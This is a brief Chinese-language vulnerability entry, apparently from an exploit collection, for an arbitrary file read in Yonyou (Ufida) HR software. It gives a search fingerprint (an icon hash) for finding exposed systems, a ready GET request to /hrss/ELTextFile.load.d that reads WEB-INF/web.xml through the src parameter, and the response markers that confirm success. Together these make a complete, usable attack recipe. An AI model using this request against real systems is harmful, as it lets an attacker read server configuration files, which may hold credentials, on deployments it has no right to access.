# 用友UfidaELTextFile.load.d任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`icon_hash="-628229493"`
- **请求**：`GET /hrss/ELTextFile.load.d?src=WEB-INF/web.xml HTTP/1.1`
- **响应特征**：200 <context-param> 、<param-value>